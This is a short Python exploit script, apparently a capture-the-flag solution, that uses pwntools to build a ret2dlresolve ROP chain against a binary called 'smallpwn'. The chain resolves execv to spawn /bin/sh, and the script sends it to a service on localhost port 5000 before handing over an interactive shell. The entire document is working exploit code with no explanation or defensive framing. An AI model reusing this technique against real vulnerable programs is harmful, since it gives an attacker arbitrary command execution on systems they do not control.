from pwn import *

context.arch = "amd64"

smallpwn = ELF("./server/smallpwn")
rop = ROP(smallpwn)

dlresolve = Ret2dlresolvePayload(smallpwn, symbol="execv", args=["/bin/sh",0])
rop.gets(dlresolve.data_addr) 
rop.ret2dlresolve(dlresolve)
#https://docs.pwntools.com/en/stable/rop/ret2dlresolve.html

#doit = process("./smallpwn")
doit = remote("localhost", 5000)

rop_payload = b"AAAAAAAA" + rop.chain()

assert b"\n" not in rop_payload

doit.sendline(rop_payload)
doit.sendline(dlresolve.payload)


doit.interactive()

